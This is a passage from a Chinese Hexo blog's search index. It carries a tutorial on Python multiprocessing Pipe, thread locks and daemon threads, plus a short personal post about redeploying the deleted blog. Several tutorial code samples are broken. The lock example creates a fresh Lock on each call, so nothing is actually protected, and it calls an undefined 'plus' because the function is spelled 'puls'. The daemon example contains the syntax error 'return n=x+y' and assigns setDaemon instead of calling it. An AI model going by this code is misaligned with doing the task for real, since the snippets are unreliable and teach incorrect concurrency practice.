<p>Pipe 返回 conn1 和 conn2 代表水管的两端。Pipe 还有一个参数 duplex，默认为 True。当 duplex 为 True 时，开启双工模式，此时水管的两边都可以进行收发。当 duplex 为 False，那么 <strong>conn1 只负责接受信息，conn2 只负责发送信息。</strong><br>conn 通过 send() 和 recv() 来发送和接受信息。值得注意的是，如果管道中没有信息可接受，recv() 会一直阻塞直到管道关闭（任意一端进程接结束则管道关闭）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Pipe</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span><span class="params">(p,nums)</span>:</span></span><br><span class="line">    print(<span class="string">'现在的进程编号为：%s，这个一个send进程'</span> % os.getpid())</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        p.send(num)</span><br><span class="line">        print(<span class="string">'%s已经放入管道中啦！'</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(p)</span>:</span></span><br><span class="line">    print(<span class="string">'现在的进程编号为：%s，这个一个recv进程'</span> % os.getpid())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'已经从管道中获取%s并从中删除'</span> % p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = Pipe(duplex=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 此时Pipe[1]即是Pipe返回的conn2</span></span><br><span class="line">    p1 = Process(target=put_data,args=(p[<span class="number">1</span>],[<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>],))</span><br><span class="line">    <span class="comment"># 此时Pipe[0]即是Pipe返回的conn1</span></span><br><span class="line">    p3 = Process(target=get_data,args=(p[<span class="number">0</span>],))</span><br><span class="line">    p1.start()</span><br><span class="line">    p3.start()</span><br><span class="line">    p1.join()</span><br><span class="line">    p3.terminate()</span><br></pre></td></tr></table></figure>
<p>让我们看一下输出结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">现在的进程编号为：9868，这个一个recv进程</span><br><span class="line">现在的进程编号为：9072，这个一个send进程</span><br><span class="line">1已经放入管道中啦！</span><br><span class="line">已经从管道中获取1,并从中删除</span><br><span class="line">2已经放入管道中啦！</span><br><span class="line">已经从管道中获取2并从中删除</span><br><span class="line">3已经放入管道中啦！</span><br><span class="line">已经从管道中获取3并从中删除</span><br></pre></td></tr></table></figure>
<h2 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h2><p>多线程中任务中，可能会发生多个线程同时对一个公共资源（如全局变量）进行操作的情况，这是就会发生混乱。为了避免这种情况，需要引入线程锁的概念。只有一个线程能处于上锁状态，当一个线程上锁之后，如果有另外一个线程试图获得锁，该线程就会挂起直到拥有锁的线程将锁释放。这样就保证了同时只有一个线程对公共资源进行访问或修改。  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread,Lock</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puls</span><span class="params">()</span>:</span></span><br><span class="line">    lock = Lock() <span class="comment"># 获得一个锁</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    lock.acquire() <span class="comment"># 上锁</span></span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    print(num)</span><br><span class="line">    lock.release() <span class="comment"># 解锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        t = Thread(target=plus)</span><br><span class="line">        t.start()</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>
<p>锁的好处:</p>
<ol>
<li>确保某段关键代码只能由一个线程从头到尾执行，保证了数据的唯一性。  </li>
</ol>
<p>锁的坏处:  </p>
<ol>
<li>阻止了多线程并发执行，效率大大降低。</li>
<li>由于存在多个锁，不同的线程持有不同的锁并试图获取对方的锁时，可能造成死锁。  </li>
</ol>
<h2 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h2><p>线程其实并没有主次的概念，我们一般说的‘主线程’实际上是 main 函数的线程，而所谓主线程结束子线程也会结束是因为在主线程结束时调用了系统的退出函数。而守护线程是指 <code>不重要线程</code>。主线程在所有 <code>重要</code> 线程结束后结束。通常当客户端访问服务器时会为这次访问开启一个守护线程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">n = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> n=x+y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    t = Thread(target=count,args=(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">    t.setDaemon = <span class="literal">True</span> <span class="comment"># 设为守护进程</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhihu.com/question/25532384/answer/81152571" target="_blank" rel="noopener">进程和线程的区别</a></p>
<p><a href="https://blog.csdn.net/qq_32131499/article/details/94561780" target="_blank" rel="noopener">写时复制</a></p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>重新开始</title>
    <url>/2017/12/02/%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<p>前阵子手贱删了博客文件，还糊里糊涂地把coding里的项目也删了。然后各种蜜汁错误，各种无法重新部署。最近几天又蜜汁部署成功。可以说十分难受了。</p>
<p><img src="重新开始/扶墙吐血.jpg" alt></p>
<p>不过塞翁失马，焉知非福。经过这么一遭我再次练习了一遍coding+hexo下博客的部署，也算是好事一桩了吧？（强行自我安慰一波233）<br>以后我一定天天向上，重新做人，再不手贱。</p>
<p><img src="重新开始/跪地哭.jpg" alt></p>
<p>再次感谢王哥的教程，很详细，帮助很大，很好，很棒。感兴趣的同志可以去他那里转转呀（手动滑稽）<a href="http://windliang.cc" target="_blank" rel="noopener">windliang的博客</a></p>
<p>扯到这里算是暂时结束，以后有时间再上来扯扯淡，写点学习心得啥的吧。</p>
<p><img src="重新开始/溜了.jpg" alt></p>
]]></content>
      <categories>
        <category>矫情</category>
      </categories>
      <tags>
        <tag>闲聊</tag>
      </tags>
  </entry>
</search>
